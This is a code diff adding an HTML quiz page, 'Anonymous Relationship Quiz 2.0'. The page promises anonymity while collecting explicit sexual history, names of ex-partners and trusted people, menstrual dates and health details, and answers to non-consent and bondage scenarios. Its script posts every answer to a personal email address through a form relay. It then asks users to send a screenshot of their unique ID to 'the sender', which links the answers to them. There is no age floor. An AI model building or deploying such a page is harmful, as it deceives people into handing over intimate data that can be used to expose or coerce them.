@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Anonymous Relationship Quiz 2.0</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #121212;
+      color: #f0f0f0;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+    }
+    .page {
+      display: none;
+      padding: 20px;
+    }
+    .active {
+      display: block;
+    }
+    button {
+      padding: 10px 20px;
+      margin: 15px;
+      background: #ff4081;
+      border: none;
+      color: white;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #e73370;
+    }
+    input, select, textarea {
+      padding: 10px;
+      width: 70%;
+      margin: 10px auto;
+      border-radius: 5px;
+      border: none;
+    }
+    textarea {
+      height: 120px;
+    }
+    .sponsors {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      text-align: center;
+      background: #121212;
+      padding: 5px 0;
+    }
+    .sponsors img {
+      width: 60px;
+      margin: 0 5px;
+    }
+    #progressContainer {
+      width: 80%;
+      margin: 10px auto;
+      background: #333;
+      border-radius: 5px;
+      height: 20px;
+    }
+    #progressBar {
+      height: 100%;
+      width: 0%;
+      background: #ff4081;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Landing Page -->
+  <div id="landing" class="page active">
+    <h1>Welcome to Anonymous Relationship Quiz 2.0</h1>
+    <p>Dare to reveal your untold truths.</p>
+    <button onclick="nextPage('rules')">Start</button>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+  <!-- Rules -->
+  <div id="rules" class="page">
+    <h2>Rules</h2>
+    <ul style="text-align:left; display:inline-block;">
+      <li>Be honest with your answers.</li>
+      <li>Minimum 10 words per answer (50 for Q25–Q27).</li>
+      <li>All responses remain anonymous.</li>
+    </ul>
+    <button onclick="nextPage('disclaimer')">Continue</button>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+  <!-- Disclaimer -->
+  <div id="disclaimer" class="page">
+    <h2>Disclaimer</h2>
+    <p>This quiz contains mature themes. Proceed only if comfortable.</p>
+    <button onclick="nextPage('ageGender')">I Agree</button>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+  <!-- Age & Gender -->
+  <div id="ageGender" class="page">
+    <h2>Tell us about yourself</h2>
+    <input type="number" id="age" placeholder="Enter your age"><br>
+    <select id="gender">
+      <option value="">Select Gender</option>
+      <option value="Male">Male</option>
+      <option value="Female">Female</option>
+    </select><br>
+    <button onclick="startQuiz()">Continue</button>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+  <!-- Quiz -->
+  <div id="quiz" class="page">
+    <div id="progressContainer"><div id="progressBar"></div></div>
+    <h2 id="questionText"></h2>
+    <div id="answerBox"></div>
+    <p id="validationMsg" style="color:red;"></p>
+    <button id="nextBtn" onclick="submitAnswer()">Next</button>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+  <!-- UID -->
+  <div id="uidPage" class="page">
+    <h2>Your Unique ID</h2>
+    <p id="uidDisplay"></p>
+    <p>📸 Take a Screenshot and Send it to the sender to receive your Rewards!</p>
+    <img src="uid-example.png" alt="UID Example" style="max-width:200px; margin-top:10px; border:2px solid #fff; border-radius:10px;">
+    <button onclick="nextPage('credits')">Continue</button>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+  <!-- Credits -->
+  <div id="credits" class="page">
+    <h2>Credits</h2>
+    <p>Anonymous Relationship Quiz 2.0 – Powered by our Sponsors</p>
+    <form id="quizForm" action="https://formsubmit.co/sagnikbhattacharjee8@gmail.com" method="POST">
+      <input type="hidden" name="data" id="formData">
+      <button type="submit">Finish & Submit</button>
+    </form>
+    <div class="sponsors">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.05 PM.jpeg" alt="Sponsor1">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.04 PM.jpeg" alt="Sponsor2">
+      <img src="WhatsApp Image 2025-09-13 at 10.49.06 PM.jpeg" alt="Sponsor3">
+    </div>
+  </div>
+
+<script>
+  const questions = [
+    "Are you a Virgin?", // Q1
+    "What is your Body Count?",
+    "Which body part do you observe at first when you see someone? (Except Face)",
+    "Have you ever cheated on any of your partner?",
+    "Name All your Ex(s).",
+    "Mention Every Breakup, why it didn't worked out?",
+    "Ever Had Breakup S*x?",
+    "Do you Smoke or Consume Alcohol? If yes how often?",
+    "Any Notable Incidents of being Drunk?",
+    "Ever had S*x While being intoxicated?",
+    "Name and mention relation of the person(s) you trust the most and can share anything from your life without thinking twice.",
+    "Ever had S*x during periods?",
+    "Have PCOS/PCOD?",
+    "What is your period cycle? (Dates)",
+    "Have pain in your lower belly during periods?",
+    "Usual Go to remedies for period pain?",
+    "[IMAGE QUESTION]",
+    "Ever had S*x in public place?",
+    "How long can you ride a sybian? (If not tried write as per idea)",
+    "Ever had cum inside without protection? (How many times)",
+    "Ever had cum on face / mouth? (How many times)",
+    "What turns you on the most?",
+    "Mention the insecurity when you make out with ur partner?",
+    "What if you had a crush on someone after being married?",
+    "Describe your last time having S*x Experience.",
+    "Describe your first time having S*x Experience.",
+    "Describe your worst time having S*x Experience.",
+    "Name Person(s) who you believe can risk their life to save you if needed.",
+    "Ever Tried '69' Or 'Lap Ride'? If yes describe Experience.",
+    "If your Partner/Crush is kidnapped by a Female Friend of Yours ... (long scenario)",
+    "What would you do, if a situation arises for Non Consensual Foreplay?",
+    "If Ch*king, slapping, tieing up or leaving marks happen, what is your reaction?",
+    "Imagine being tied up and teased until you're shaking – would you hold out?",
+    "Imagine being tied up, teased but stopped every time – how long could you last?",
+    "Blindfolded, touched, teased – would you survive or melt instantly?",
+    "Restrained, teased with ice, warm breath, scratching – how long until breaking?",
+    "Edged repeatedly, no release – could you hold out 30 min, 1 hr, longer?",
+    "Partner whispers fantasies & teases – would you obey or break?",
+    "Touched & teased but denied release – how long could you endure?",
+    "Vibrating toys/clamps while restrained, denied climax – can you last a day?",
+    "Save parents vs partner vs trusted friend – choose & explain."
+  ];
+
+  let currentQuestion = 0;
+  let answers = {};
+  let uid = "UID-" + Math.floor(100000 + Math.random() * 900000);
+
+  function nextPage(id) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  function startQuiz() {
+    currentQuestion = 0;
+    showQuestion();
+    nextPage('quiz');
+  }
+
+  function showQuestion() {
+    document.getElementById("validationMsg").innerText = "";
+    const qText = document.getElementById("questionText");
+    const aBox = document.getElementById("answerBox");
+    aBox.innerHTML = "";
+
+    if (currentQuestion >= questions.length) {
+      document.getElementById("uidDisplay").innerText = uid;
+      document.getElementById("formData").value = JSON.stringify(answers);
+      nextPage("uidPage");
+      return;
+    }
+
+    // Progress bar update
+    let progressPercent = ((currentQuestion) / questions.length) * 100;
+    document.getElementById("progressBar").style.width = progressPercent + "%";
+
+    qText.innerText = "Q" + (currentQuestion + 1) + ": " + questions[currentQuestion];
+
+    if (currentQuestion === 0) {
+      aBox.innerHTML = `
+        <button onclick="branchAnswer('Yes')">Yes</button>
+        <button onclick="branchAnswer('No')">No</button>
+      `;
+    } else if (currentQuestion === 16) {
+      aBox.innerHTML = `<img src="8ee38458-5b77-4097-975d-a18c9bef9ec7.__CR0,0,3031,1875_PT0_SX970_V1___.jpeg" alt="Image Question" style="max-width:200px;"><br>
+        <button onclick="submitImageAnswer('Liked')">Liked</button>
+        <button onclick="submitImageAnswer('Disliked')">Disliked</button>`;
+    } else {
+      aBox.innerHTML = `<textarea id="answerInput" placeholder="Write your answer here..."></textarea>`;
+    }
+  }
+
+  function branchAnswer(ans) {
+    answers[questions[currentQuestion]] = ans;
+    if (ans === "Yes") {
+      document.getElementById("uidDisplay").innerText = uid;
+      document.getElementById("formData").value = JSON.stringify(answers);
+      nextPage("uidPage");
+    } else {
+      currentQuestion++;
+      showQuestion();
+    }
+  }
+
+  function submitImageAnswer(ans) {
+    answers[questions[currentQuestion]] = ans;
+    currentQuestion++;
+    showQuestion();
+  }
+
+  function submitAnswer() {
+    if (currentQuestion === 0 || currentQuestion === 16) return;
+
+    let input = document.getElementById("answerInput").value.trim();
+    let wordCount = input.split(/\s+/).filter(w => w.length > 0).length;
+
+    if ((currentQuestion >= 24 && currentQuestion <= 26 && wordCount < 50) ||
+        (wordCount < 10)) {
+      document.getElementById("validationMsg").innerText = 
+        currentQuestion >= 24 && currentQuestion <= 26 ? 
+        "Answer too short. Minimum 50 words required." : 
+        "Answer too short. Minimum 10 words required.";
+      return;
+    }
+
+    answers[questions[currentQuestion]] = input;
+    currentQuestion++;
+    showQuestion();
+  }
+</script>
+</body>
+</html>
